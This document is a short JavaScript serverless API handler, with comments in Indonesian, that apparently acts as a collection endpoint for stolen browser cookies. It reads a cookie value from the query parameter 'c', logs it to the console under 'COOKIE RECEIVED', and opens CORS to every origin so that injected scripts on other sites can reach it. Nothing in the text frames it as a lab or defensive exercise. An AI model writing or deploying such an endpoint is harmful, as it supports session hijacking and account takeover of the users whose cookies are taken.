export default function handler(req, res) {
  const { c } = req.query;

  console.log('--- COOKIE RECEIVED ---');
  console.log(c);
  console.log('-----------------------');

  // Tambahkan header CORS sebelum mengirim respons
  res.setHeader('Access-Control-Allow-Origin', '*'); // Izinkan dari semua origin
  
  res.status(200).json({ status: 'ok', message: 'Cookie received' });
}